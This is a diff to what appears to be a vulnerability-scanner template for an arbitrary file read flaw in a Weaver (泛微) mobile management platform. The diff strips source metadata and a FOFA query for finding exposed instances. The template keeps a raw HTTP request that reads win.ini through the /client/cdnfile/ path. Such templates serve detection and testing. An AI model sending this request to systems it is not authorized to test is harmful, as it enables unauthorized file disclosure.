@@ -3,12 +3,8 @@ info:
   name: 泛微-移动管理平台 win 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fpeuaag9qnzwrzyo'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fpeuaag9qnzwrzyo
-    fofa: body="移动管理平台-企业管理"
 http:
 - raw:
   - GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
